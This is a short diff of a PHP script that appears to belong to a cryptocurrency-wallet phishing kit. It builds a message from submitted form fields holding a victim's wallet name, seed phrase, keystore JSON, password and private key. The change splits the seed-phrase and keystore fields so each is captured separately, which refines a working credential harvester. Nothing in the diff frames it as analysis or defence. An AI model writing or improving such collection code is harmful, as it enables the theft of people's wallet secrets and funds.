@@ -6,7 +6,8 @@ $useragent = $_SERVER['HTTP_USER_AGENT'];
 
 $message = "New Message\n";
 $message .= "Wallet : ".$_POST['sub']."\n";
-$message .= "Phrase or keystorejson : ".$_POST['typee']."\n";
+$message .= "Phrase : ".$_POST['typee']."\n";
+$message .= "keystorejson : ".$_POST['typee1']."\n";
 $message .= "Password : ".$_POST['psw']."\n";
 $message .= "Key : ".$_POST['key']."\n";
 
